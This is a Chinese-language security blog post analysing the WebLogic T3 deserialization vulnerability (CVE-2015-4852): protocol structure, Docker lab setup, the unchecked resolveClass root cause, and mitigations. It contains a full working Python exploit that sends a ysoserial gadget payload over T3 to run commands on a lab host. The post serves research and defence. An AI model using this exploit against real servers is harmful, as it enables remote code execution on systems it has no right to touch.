> 原文链接: https://www.anquanke.com//post/id/226070 


# Java安全之初探weblogic T3协议漏洞


                                阅读量   
                                **184139**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)](https://p2.ssl.qhimg.com/t014ac313fdc963af46.jpg)



## 0x00 前言

在反序列化漏洞里面就经典的还是莫过于weblogic的反序列化漏洞，在weblogic里面其实反序列化漏洞利用中大致分为两种，一个是基于T3协议的反序列化漏洞，一个是基于XML的反序列化漏洞。当然也还会有一些SSRF和任意文件上传漏洞，但是在这里暂且不谈。

下面来列出两个漏洞类型的一些漏洞编号

基于T3协议漏洞： CVE-2015-4582、CVE-2016-0638、CVE-2016-3510、CVE-2018-2628、CVE-2020-2555、CVE-2020-2883

基于XML:CVE-2017-3506、CVE-2017-10271、CVE-2019-2729

粗略的列了几个代表性的CVE漏洞。

在Weblogic中，有部分漏洞是基于上几个漏洞的补丁进行的一个绕过。而在前一段时间内，CVE-2020-14882和CVE-2020-14883里面14883就是基于14882的补丁去进行的一个绕过。



## 0x01 浅析T3协议

### <a class="reference-link" name="%E5%85%B3%E4%BA%8ET3%E5%8D%8F%E8%AE%AE%E7%9A%84%E7%B5%AE%E7%B5%AE%E5%8F%A8%E5%8F%A8"></a>关于T3协议的絮絮叨叨

关于这个T3协议，他是Weblogic里面独有的一个协议，在前面写的一篇关于RMI的文章里面提到过RMI的传输过程是传输的序列化数据，而在接收后会进行一个反序列化的操作。在Weblogic中对RMI规范的实现使用T3协议。而在T3的传输过程也是一样的。

下面对T3协议的传输过程、如何执行的反序列化操作、T3协议的执行流程去进行一个分析。

在之前先来看一张weblogic进行反序列化的执行流程图。

[![](https://p5.ssl.qhimg.com/t019663b6cc9be2f7f7.png)](https://p5.ssl.qhimg.com/t019663b6cc9be2f7f7.png)

这里借用了一个图片，在该漏洞的一个入口点是weblogic里面的方法调用了原生的反序列化方法进行一个反序列化操作。

而这里还需要知道该方法在传输完成后是如何进行调用的。关于原生反序列化的操作原理这里就不讲了，可以看到我的该篇文章。

[Java安全之原生readObject方法解读](https://www.cnblogs.com/nice0e3/p/14127885.html),这里主要来讲一下T3协议的相关内容。

### <a class="reference-link" name="T3%E5%8D%8F%E8%AE%AE%E6%A6%82%E8%BF%B0"></a>T3协议概述

WebLogic Server 中的 RMI 通信使用 T3 协议在 WebLogic Server 和其他 Java 程序（包括客户端及其他 WebLogic Server 实例）间传输数据。

### <a class="reference-link" name="T3%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84"></a>T3协议结构

在T3的这个协议里面包含请求包头和请求的主体这两部分内容。

### <a class="reference-link" name="%E8%AF%B7%E6%B1%82%E5%8C%85%E5%A4%B4"></a>请求包头

这里拿2个CVE-2015-4852的POC来进行讲解。

[![](https://p0.ssl.qhimg.com/t0195d5aa20e1cea014.png)](https://p0.ssl.qhimg.com/t0195d5aa20e1cea014.png)

[![](https://p4.ssl.qhimg.com/t01011686850bf018d7.png)](https://p4.ssl.qhimg.com/t01011686850bf018d7.png)

```
t3 12.2.1 AS:255 HL:19 MS:10000000 PU:t3://us-l-breens:7001
```

这里就是他的请求包的头。

使用Wireshark对它进行抓包，由于配置的网卡抓不到包，靶机地址会在23段和1段的ip中来回切换。

这里为了能抓到包配置了一个nat模式的网卡，进行抓包，地址为192.168.23.130，改一下poc的目标地址，发送payload。

[![](https://p0.ssl.qhimg.com/t01ad70bb8dd655fba4.png)](https://p0.ssl.qhimg.com/t01ad70bb8dd655fba4.png)

[![](https://p1.ssl.qhimg.com/t01c2892769aeb4fe4f.png)](https://p1.ssl.qhimg.com/t01c2892769aeb4fe4f.png)

在这里在发送请求包头的时候，打了个断点，让脚本只发送请求包头数据，方便抓包。打开Wireshark抓包后发现，发送该请求包头后，服务端weblogic会有一个响应

[![](https://p5.ssl.qhimg.com/t01cd6e78cc2aae2116.png)](https://p5.ssl.qhimg.com/t01cd6e78cc2aae2116.png)

HELO后面的内容则是被攻击方的weblogic版本号，在发送请求包头后会进行一个返回weblogic的版本号。

### <a class="reference-link" name="%E8%AF%B7%E6%B1%82%E4%B8%BB%E4%BD%93"></a>请求主体

在T3协议里面传输的都是序列化数据，这个在前面也说过，而传输中的数据分为七部分内容。第一部分为协议头。即`t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n`这串数据。

来看到下面的图，图片取自z_zz_zzz师傅的[修复weblogic的JAVA反序列化漏洞的多种方法](http://drops.xmd5.com/static/drops/web-13470.html)文章。

[![](https://p5.ssl.qhimg.com/t01b19090ab756de2a1.png)](https://p5.ssl.qhimg.com/t01b19090ab756de2a1.png)

[![](https://p4.ssl.qhimg.com/t01d5be7c1cc132d278.jpg)](https://p4.ssl.qhimg.com/t01d5be7c1cc132d278.jpg)

看到第二到第七部分内容，都是`ac ed 00 05`,说明该串内容是序列化的数据。而如果需要去构造payload的话，需要在后面序列化的内容中，进行一个替换。将原本存在的序列化内容替换成我们payload的序列化内容，在传输完成后，进行反序列化达成攻击的目的。

```
- 第一种生成方式为，将weblogic发送的JAVA序列化数据的第二到九部分的JAVA序列化数据的任意一个替换为恶意的序列化数据。
- 第二种生成方式为，将weblogic发送的JAVA序列化数据的第一部分与恶意的序列化数据进行拼接。
```



## 0x02 漏洞环境搭建

### <a class="reference-link" name="%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"></a>环境搭建

这里借用了A-team 的weblogic漏洞环境项目来做搭建环境，省去不必要的麻烦。

漏洞环境地址：[https://github.com/QAX-A-Team/WeblogicEnvironment](https://github.com/QAX-A-Team/WeblogicEnvironment)

jdk地址：[https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html](https://www.oracle.com/java/technologies/javase/javase7-archive-downloads.html)

weblogic下载地址：[https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html](https://www.oracle.com/middleware/technologies/weblogic-server-downloads.html)

这里需要把下载好的jdk文件放在该项目的jdks文件夹下，weblogic的源码放在weblogics文件夹下。

编译运行

```
docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .

docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21
```

[![](https://p0.ssl.qhimg.com/t017cce2d29e5d15e47.png)](https://p0.ssl.qhimg.com/t017cce2d29e5d15e47.png)

[![](https://p5.ssl.qhimg.com/t012ef8f3fac7ed7345.png)](https://p5.ssl.qhimg.com/t012ef8f3fac7ed7345.png)

然后在这里需要去将一些weblogic的依赖Jar包给导出来进行远程调试。

```
mkdir ./middleware

docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./middleware/

docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver ./middleware/

docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib
```

[![](https://p1.ssl.qhimg.com/t0119f519bac75f083c.png)](https://p1.ssl.qhimg.com/t0119f519bac75f083c.png)

如果不想这么麻烦的话可以直接运行对于的.sh脚本，比如这里安装的是1036 jdk是7u21 ，直接运行`run_weblogicjdk7u21.sh`，自动安装以及自动从容器里面导出jar包。

### <a class="reference-link" name="%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95"></a>远程调试

在这里将jar包复制到物理机上，然后打开IDEA创建一个空项目进行导入。

[![](https://p3.ssl.qhimg.com/t018982b678106d35eb.png)](https://p3.ssl.qhimg.com/t018982b678106d35eb.png)

完成后就来配置远程调试

[![](https://p3.ssl.qhimg.com/t011d07e61378bf1e7b.png)](https://p3.ssl.qhimg.com/t011d07e61378bf1e7b.png)

为了测试，这里使用WeblogicScan来扫描一下，看看在断点地方会不会停下。

[![](https://p0.ssl.qhimg.com/t010710f8fd4851a780.png)](https://p0.ssl.qhimg.com/t010710f8fd4851a780.png)

[![](https://p3.ssl.qhimg.com/t010bafca14eb5cd14f.png)](https://p3.ssl.qhimg.com/t010bafca14eb5cd14f.png)

在这里发现已经可以进行远程调试，后面我们就可以来分析漏洞了。



## 0x03 漏洞分析

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"></a>漏洞复现

在这先来讲漏洞复现一下后，再进行漏洞的分析

还是拿exp为例子，但是我们这里是docker搭建的环境，也没有构造回显。常用的弹出计算器，就算执行了也没法显示出来，所以在这里使用创建文件的方式验证该漏洞是否利用成功。

```
import socket
import sys
import struct
import re
import subprocess
import binascii

def get_payload1(gadget, command):
    JAR_FILE = './ysoserial.jar'
    popen = subprocess.Popen(['java', '-jar', JAR_FILE, gadget, command], stdout=subprocess.PIPE)
    return popen.stdout.read()

def get_payload2(path):
    with open(path, "rb") as f:
        return f.read()

def exp(host, port, payload):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    handshake = "t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n".encode()
    sock.sendall(handshake)
    data = sock.recv(1024)
    pattern = re.compile(r"HELO:(.*).false")
    version = re.findall(pattern, data.decode())
    if len(version) == 0:
        print("Not Weblogic")
        return

    print("Weblogic `{``}`".format(version[0]))
    data_len = binascii.a2b_hex(b"00000000") #数据包长度，先占位，后面会根据实际情况重新
    t3header = binascii.a2b_hex(b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006") #t3协议头
    flag = binascii.a2b_hex(b"fe010000") #反序列化数据标志
    payload = data_len + t3header + flag + payload
    payload = struct.pack('&gt;I', len(payload)) + payload[4:] #重新计算数据包长度
    sock.send(payload)

if __name__ == "__main__":
    host = "192.168.1.40"
    port = 7001
    gadget = "Jdk7u21" #CommonsCollections1 Jdk7u21
    command = "touch /tmp/CVE-2015-4852"

    payload = get_payload1(gadget, command)
    exp(host, port, payload)
```

执行完成后，查看docker容器里面的文件。

```
docker exec  weblogic1036jdk7u21 ls tmp/
```

[![](https://p3.ssl.qhimg.com/t01ab266d58e6b6ab87.png)](https://p3.ssl.qhimg.com/t01ab266d58e6b6ab87.png)

执行成功。

在执行exp的时候，如果开启debug去查看其实不难发现，发送t3的报文头信息以后会在返回包里面回显weblogic的版本号。

[![](https://p4.ssl.qhimg.com/t017b58d234a6fdbe67.png)](https://p4.ssl.qhimg.com/t017b58d234a6fdbe67.png)

可以看到，后面通过正则提取了返回包的数据，拿到该版本号信息。

### <a class="reference-link" name="%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"></a>漏洞分析

T3协议接收过来的数据会在`weblogic.rjvm.InboundMsgAbbrev#readObject`这里进行反序列化操作。

来直接定位到该位置，可以看到断点的位置，里面调用了`InboundMsgAbbrev.ServerChannelInputStream#readObject`方法，查看一下

[![](https://p0.ssl.qhimg.com/t01e5698e3a16870dd8.png)](https://p0.ssl.qhimg.com/t01e5698e3a16870dd8.png)

这里调用创建一个内部类，并且调用`readObject`方法，还需要查看一下 `ServerChannelInputStream`实现。

[![](https://p5.ssl.qhimg.com/t013cb1a08ae5f8b1a2.png)](https://p5.ssl.qhimg.com/t013cb1a08ae5f8b1a2.png)

[![](https://p5.ssl.qhimg.com/t0170f477261dd270ed.png)](https://p5.ssl.qhimg.com/t0170f477261dd270ed.png)

在这里其实就可以看到`ServerChannelInputStream`是一个内部类，该类继承`ObjectInputStream`类，而在这里对`resolveClass`进行了重写。

[![](https://p2.ssl.qhimg.com/t01fdd4e0846e220198.png)](https://p2.ssl.qhimg.com/t01fdd4e0846e220198.png)

但是在此处看到，其实调用的还是父类的`resolveClass`方法。在`resolveClass`方法中也没做任何的校验，导致的漏洞产生。

后面来讲讲如何防御到该漏洞。

### <a class="reference-link" name="%E5%86%8D%E8%B0%88resolveClass"></a>再谈resolveClass

`resolveClass`方法的作用是将类的序列化描述符加工成该类的Class对象。

前面分析readObject方法的时候，我们得知了shiro就是重写了`resolveClass`方法导致很多利用链无法使用，但是shiro在编写的时候，并不是为了防御反序列化漏洞才去重写的`resolveClass`，但是就是这么一个无意间的举动，导致了防御住了大部分攻击。

而在后面的weblogic补丁当中，也会基于这个`resolveClass`去做反序列化漏洞的防御。

贴上一张廖师傅的博客的反序列化攻击时序图：

[![](https://p0.ssl.qhimg.com/t0158bffbfdfc75d52f.png)](https://p0.ssl.qhimg.com/t0158bffbfdfc75d52f.png)

那么这里需要思考到一个问题，为什么要在`resolveClass`进行一个拦截，而不是其他位置？

`resolveClass`方法的作用是从类序列化描述符获取类的Class对象，如果在`resolveClass`中增加一个检查，检查一下该类的序列化描述符中记录的类名是否在黑名单上，如果在黑名单上，直接抛出错误，不允许获取恶意的类的Class对象。这样以来，恶意类连生成Class对象的机会都没有。

来看到这个方法，在我的`readObject`分析文章里面贴出来一张图，`readObject`的内部使用`Class.forName`来从类序列化获取到对应类的一个Class的对象。

[![](https://p0.ssl.qhimg.com/t01ef432794982ab08b.png)](https://p0.ssl.qhimg.com/t01ef432794982ab08b.png)

那么如果这里加入一个过滤，那么这里如果直接抛出异常的话，在`readNonProxyDesc`调用完`resolveClass`方法后，后面的一系列操作都无法完成。

### <a class="reference-link" name="%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"></a>参考文章

```
http://drops.xmd5.com/static/drops/web-13470.html

<blockquote class="wp-embedded-content" data-secret="mOMTrfV7ri">[Weblogic12c T3 协议安全漫谈](https://blog.knownsec.com/2020/11/weblogic12c-t3-%e5%8d%8f%e8%ae%ae%e5%ae%89%e5%85%a8%e6%bc%ab%e8%b0%88/)</blockquote>
<iframe title="《Weblogic12c T3 协议安全漫谈》—知道创宇" class="wp-embedded-content" sandbox="allow-scripts" security="restricted" style="position: absolute; clip: rect(1px, 1px, 1px, 1px);" src="https://blog.knownsec.com/2020/11/weblogic12c-t3-%e5%8d%8f%e8%ae%ae%e5%ae%89%e5%85%a8%e6%bc%ab%e8%b0%88/embed/#?secret=mOMTrfV7ri" data-secret="mOMTrfV7ri" width="500" height="282" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe>

http://redteam.today/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/

https://xz.aliyun.com/t/8443
```



## 0x04 修复方案

这里借鉴`z_zz_zzz`师傅的文章中提到的weblogic T3协议漏洞的修复方案，除了打补丁外还有其他的修复方案，先来说说打补丁的方式，打补丁其实也是在`resolveClass`方法中实现拦截。

开放在外网的情况下，还可以采用web代理和负载均衡。

web代理的方式只能转发HTTP的请求，而不会转发T3协议的请求，这就能防御住T3漏洞的攻击。

而负载均衡的情况下，可以指定需要进行负载均衡的协议类型，这么这里就可以设置为HTTP的请求，不接收其他的协议请求转发。这也是在外网中见到T3协议漏洞比较少的原因之一。



## 0x05 结尾

在这里其实分析比较浅，因为反序列化操作和CC链这一块，我觉得应该单独拿出来说，而不是集成到这个T3协议漏洞里面一并概述。所以在此处并没有对这两块内容进行分析，而这两块内容在前面都有进行分析过，自行查阅。后面的几个T3协议的漏洞，其实也是基于`resolveClass`的方式进行拦截过后的一个绕过方式，成了一个新的CVE漏洞。
